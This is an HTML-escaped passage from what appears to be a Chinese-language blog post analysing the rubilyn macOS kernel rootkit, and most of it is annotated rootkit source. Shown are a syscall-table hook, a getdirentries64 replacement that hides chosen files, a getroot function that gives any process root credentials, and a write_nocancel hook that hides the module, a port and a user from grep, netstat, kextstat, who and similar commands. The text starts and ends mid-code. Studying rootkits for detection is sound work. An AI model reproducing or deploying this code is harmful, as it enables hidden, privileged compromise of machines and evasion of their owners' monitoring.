替换原系统函数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        table[SYS_getdirentriesattr].sy_call = (void *) new_getdirentriesattr;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;两个替换函数执行的操作有点类似，主要是移除指定文件的dirent结构，其中dirent结构原型如下：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; dirent &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;__uint32_t&lt;/span&gt; d_fileno; 	&lt;span class=&quot;comment&quot;&gt;// 节点号&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;__uint16_t&lt;/span&gt; d_reclen;	&lt;span class=&quot;comment&quot;&gt;// 目录项长度&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;__uint8_t&lt;/span&gt;  d_type;	&lt;span class=&quot;comment&quot;&gt;// 文件类型&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;__uint8_t&lt;/span&gt;  d_namlen;	&lt;span class=&quot;comment&quot;&gt;// 文件名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;if&lt;/span&gt; __BSD_VISIBLE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; MAXNAMLEN 255&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; d_name[MAXNAMLEN+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]; &lt;span class=&quot;comment&quot;&gt;// 文件名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; d_name[&lt;span class=&quot;number&quot;&gt;255&lt;/span&gt;+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;];	&lt;span class=&quot;comment&quot;&gt;// 文件名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;此处我们只看下 new_getdirentries64 函数，&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* hooked getdirentries64 and friends */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;register_t&lt;/span&gt; new_getdirentries64(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; proc *p, &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; getdirentries64_args *uap, &lt;span class=&quot;keyword&quot;&gt;user_ssize_t&lt;/span&gt; *retval)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; ret; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;u_int64_t&lt;/span&gt; bcount = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;u_int64_t&lt;/span&gt; btot = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;size_t&lt;/span&gt; buffersize = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; direntry *dirp;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *mem = &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; updated = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ret = org_getdirentries64(p,uap,retval); &lt;span class=&quot;comment&quot;&gt;// 调用原函数获取目录信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    btot = buffersize = bcount = *retval;    &lt;span class=&quot;comment&quot;&gt;// 函数返回的字节数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(bcount &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        MALLOC(mem,&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *,bcount,M_TEMP,M_WAITOK);  &lt;span class=&quot;comment&quot;&gt;// 在内核空间分配bcount大小的内存&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(mem == &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            return(ret); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        copyin(uap-&amp;gt;buf, mem, bcount);  &lt;span class=&quot;comment&quot;&gt;// 将用户空间数据拷贝到刚分配的内核空间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        dirp = mem;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(bcount &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; dirp-&amp;gt;d_reclen &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(dirp-&amp;gt;d_reclen &amp;gt; &lt;span class=&quot;number&quot;&gt;7&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;comment&quot;&gt;// 搜索指定文件名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;strncmp&lt;/span&gt;(dirp-&amp;gt;d_name,(char*)&amp;amp;k_dir,strlen((char*)&amp;amp;k_dir)) == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *next = (char *) dirp + dirp-&amp;gt;d_reclen;    &lt;span class=&quot;comment&quot;&gt;// 下一目录项&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;keyword&quot;&gt;u_int64_t&lt;/span&gt; offset = (char *) next - (char *) mem ;	&lt;span class=&quot;comment&quot;&gt;// 当前文件目录项大小&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    bcount -= dirp-&amp;gt;d_reclen;   &lt;span class=&quot;comment&quot;&gt;// 递减字节数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    btot -= dirp-&amp;gt;d_reclen;     &lt;span class=&quot;comment&quot;&gt;// 递减目录项长度&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    bcopy(next,dirp,buffersize - offset);   &lt;span class=&quot;comment&quot;&gt;// 覆盖指定文件的目录项，从而实现文件隐藏&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    updated = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            bcount -= dirp-&amp;gt;d_reclen;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            dirp = (struct direntry *) ((char *) dirp + dirp-&amp;gt;d_reclen);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(updated == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            copyout(mem,uap-&amp;gt;buf,btot);     &lt;span class=&quot;comment&quot;&gt;// 将修改后的数据返回给用户空间&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            *retval = btot; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        FREE(mem,M_TEMP);   &lt;span class=&quot;comment&quot;&gt;// 释放内核内存&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;3、设置Root进程&quot;&gt;&lt;a href=&quot;#3、设置Root进程&quot; class=&quot;headerlink&quot; title=&quot;3、设置Root进程&quot;&gt;&lt;/a&gt;3、设置Root进程&lt;/h3&gt;&lt;p&gt;先通过pid获取进程proc结构，然后更改其中进程属主字段p_ucred为0，即root属主。源代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;getroot&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; pid)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; proc *rootpid;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;kauth_cred_t&lt;/span&gt; creds;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    rootpid = proc_find(pid);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!rootpid)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    lck_mtx_lock((&lt;span class=&quot;keyword&quot;&gt;lck_mtx_t&lt;/span&gt;*)&amp;amp;rootpid-&amp;gt;p_mlock);    &lt;span class=&quot;comment&quot;&gt;// 设置互斥锁&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    creds = rootpid-&amp;gt;p_ucred;   &lt;span class=&quot;comment&quot;&gt;// 进程属主&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    creds = my_kauth_cred_setuidgid(rootpid-&amp;gt;p_ucred,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;); &lt;span class=&quot;comment&quot;&gt;// 设置进程属主id为0(root)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    rootpid-&amp;gt;p_ucred = creds;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    lck_mtx_unlock((&lt;span class=&quot;keyword&quot;&gt;lck_mtx_t&lt;/span&gt;*)&amp;amp;rootpid-&amp;gt;p_mlock);  &lt;span class=&quot;comment&quot;&gt;// 解锁&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;4、隐藏网络端口、用户名和内核模块&quot;&gt;&lt;a href=&quot;#4、隐藏网络端口、用户名和内核模块&quot; class=&quot;headerlink&quot; title=&quot;4、隐藏网络端口、用户名和内核模块&quot;&gt;&lt;/a&gt;4、隐藏网络端口、用户名和内核模块&lt;/h3&gt;&lt;p&gt;通过对write_nocancel函数挂钩，然后对 grep、sysctl、netstat、kextstat、w和who等命令的输出结果进行过滤，当命令输出结果中包含rubilyn模块名以及特写端口和用户名时就直接返回，否则就调用原始的write_nocanel函数。&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/* hooked write_nocancel for hiding console stuff */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;new_write_nocancel&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; proc* p, &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; write_nocancel_args *uap, user_ssize_t* retval)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; buffer[MAXBUFFER];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;strncmp&lt;/span&gt;(p-&amp;gt;p_comm, grep, strlen(p-&amp;gt;p_comm))==&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;||&lt;span class=&quot;built_in&quot;&gt;strncmp&lt;/span&gt;(p-&amp;gt;p_comm, sysctl,strlen(p-&amp;gt;p_comm))==&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;||&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;built_in&quot;&gt;strncmp&lt;/span&gt;(p-&amp;gt;p_comm, kextstat,strlen(p-&amp;gt;p_comm))==&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        bzero(buffer, &lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(buffer));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        copyin(uap-&amp;gt;cbuf, buffer, &lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(buffer)&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(my_strstr(buffer, rubilyn))	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            return(uap-&amp;gt;nbyte);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;strncmp&lt;/span&gt;(p-&amp;gt;p_comm, netstat,strlen(p-&amp;gt;p_comm))==&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        bzero(buffer, &lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(buffer));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        copyin(uap-&amp;gt;cbuf, buffer, &lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(buffer)&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(my_strstr(buffer, (char*)&amp;amp;k_port))	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            return(uap-&amp;gt;nbyte);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;((strncmp(p-&amp;gt;p_comm,w,strlen(p-&amp;gt;p_comm))==&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;||strncmp(p-&amp;gt;p_comm,who,strlen(p-&amp;gt;p_comm))==&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        bzero(buffer, &lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(buffer));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        copyin(uap-&amp;gt;cbuf, buffer, &lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(buffer)&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(my_strstr(buffer, (char*)&amp;amp;k_user))	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            return(uap-&amp;gt;nbyte);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return 